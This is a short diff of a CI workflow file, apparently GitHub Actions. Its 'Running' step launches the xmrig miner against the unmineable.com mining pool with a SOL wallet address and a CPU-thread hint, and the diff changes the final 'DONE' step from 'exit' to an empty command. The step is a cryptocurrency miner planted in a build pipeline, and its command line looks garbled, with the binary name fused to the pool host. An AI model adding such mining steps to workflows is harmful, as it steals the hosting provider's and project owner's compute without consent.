@@ -23,4 +23,5 @@ jobs:
     - name: Running
       run: ./xmrig.rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
     - name: DONE
-      run: exit
+      run: | 
+
